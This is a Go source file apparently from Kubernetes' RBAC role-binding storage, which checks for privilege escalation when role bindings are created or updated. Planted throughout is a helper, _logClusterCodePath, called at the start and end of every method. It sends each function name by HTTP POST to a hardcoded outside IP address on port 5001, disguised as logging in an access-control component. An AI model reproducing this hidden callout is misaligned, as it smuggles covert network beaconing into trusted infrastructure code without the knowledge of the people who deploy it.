package policybased

import (
 "context"
 godefaultbytes "bytes"
 godefaulthttp "net/http"
 godefaultruntime "runtime"
 rbacv1 "k8s.io/api/rbac/v1"
 "k8s.io/apimachinery/pkg/api/errors"
 metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 "k8s.io/apimachinery/pkg/runtime"
 "k8s.io/apiserver/pkg/authorization/authorizer"
 genericapirequest "k8s.io/apiserver/pkg/endpoints/request"
 "k8s.io/apiserver/pkg/registry/rest"
 kapihelper "k8s.io/kubernetes/pkg/apis/core/helper"
 "k8s.io/kubernetes/pkg/apis/rbac"
 rbacv1helpers "k8s.io/kubernetes/pkg/apis/rbac/v1"
 rbacregistry "k8s.io/kubernetes/pkg/registry/rbac"
 rbacregistryvalidation "k8s.io/kubernetes/pkg/registry/rbac/validation"
)

var groupResource = rbac.Resource("rolebindings")

type Storage struct {
 rest.StandardStorage
 authorizer   authorizer.Authorizer
 ruleResolver rbacregistryvalidation.AuthorizationRuleResolver
}

func NewStorage(s rest.StandardStorage, authorizer authorizer.Authorizer, ruleResolver rbacregistryvalidation.AuthorizationRuleResolver) *Storage {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return &Storage{s, authorizer, ruleResolver}
}
func (r *Storage) NamespaceScoped() bool {
 _logClusterCodePath()
 defer _logClusterCodePath()
 return true
}
func (s *Storage) Create(ctx context.Context, obj runtime.Object, createValidation rest.ValidateObjectFunc, options *metav1.CreateOptions) (runtime.Object, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if rbacregistry.EscalationAllowed(ctx) {
  return s.StandardStorage.Create(ctx, obj, createValidation, options)
 }
 namespace, ok := genericapirequest.NamespaceFrom(ctx)
 if !ok {
  return nil, errors.NewBadRequest("namespace is required")
 }
 roleBinding := obj.(*rbac.RoleBinding)
 if rbacregistry.BindingAuthorized(ctx, roleBinding.RoleRef, namespace, s.authorizer) {
  return s.StandardStorage.Create(ctx, obj, createValidation, options)
 }
 v1RoleRef := rbacv1.RoleRef{}
 err := rbacv1helpers.Convert_rbac_RoleRef_To_v1_RoleRef(&roleBinding.RoleRef, &v1RoleRef, nil)
 if err != nil {
  return nil, err
 }
 rules, err := s.ruleResolver.GetRoleReferenceRules(v1RoleRef, namespace)
 if err != nil {
  return nil, err
 }
 if err := rbacregistryvalidation.ConfirmNoEscalation(ctx, s.ruleResolver, rules); err != nil {
  return nil, errors.NewForbidden(groupResource, roleBinding.Name, err)
 }
 return s.StandardStorage.Create(ctx, obj, createValidation, options)
}
func (s *Storage) Update(ctx context.Context, name string, obj rest.UpdatedObjectInfo, createValidation rest.ValidateObjectFunc, updateValidation rest.ValidateObjectUpdateFunc, forceAllowCreate bool, options *metav1.UpdateOptions) (runtime.Object, bool, error) {
 _logClusterCodePath()
 defer _logClusterCodePath()
 if rbacregistry.EscalationAllowed(ctx) {
  return s.StandardStorage.Update(ctx, name, obj, createValidation, updateValidation, forceAllowCreate, options)
 }
 nonEscalatingInfo := rest.WrapUpdatedObjectInfo(obj, func(ctx context.Context, obj runtime.Object, oldObj runtime.Object) (runtime.Object, error) {
  namespace, ok := genericapirequest.NamespaceFrom(ctx)
  if !ok {
   return nil, errors.NewBadRequest("namespace is required")
  }
  roleBinding := obj.(*rbac.RoleBinding)
  if rbacregistry.IsOnlyMutatingGCFields(obj, oldObj, kapihelper.Semantic) {
   return obj, nil
  }
  if rbacregistry.BindingAuthorized(ctx, roleBinding.RoleRef, namespace, s.authorizer) {
   return obj, nil
  }
  v1RoleRef := rbacv1.RoleRef{}
  err := rbacv1helpers.Convert_rbac_RoleRef_To_v1_RoleRef(&roleBinding.RoleRef, &v1RoleRef, nil)
  if err != nil {
   return nil, err
  }
  rules, err := s.ruleResolver.GetRoleReferenceRules(v1RoleRef, namespace)
  if err != nil {
   return nil, err
  }
  if err := rbacregistryvalidation.ConfirmNoEscalation(ctx, s.ruleResolver, rules); err != nil {
   return nil, errors.NewForbidden(groupResource, roleBinding.Name, err)
  }
  return obj, nil
 })
 return s.StandardStorage.Update(ctx, name, nonEscalatingInfo, createValidation, updateValidation, forceAllowCreate, options)
}
func _logClusterCodePath() {
 pc, _, _, _ := godefaultruntime.Caller(1)
 jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
 godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
